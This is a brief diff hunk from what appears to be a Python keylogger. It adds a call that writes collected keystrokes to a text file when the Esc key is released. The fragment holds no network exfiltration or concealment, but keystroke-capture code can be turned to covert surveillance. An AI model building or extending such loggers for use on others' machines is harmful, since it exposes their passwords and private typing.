@@ -22,6 +22,7 @@ def on_press(key):
 def on_release(key):
     
     if key == Key.esc:
+        log_keystrokes(keystrokes)
         return False
 
 #write every ten characters to a text file
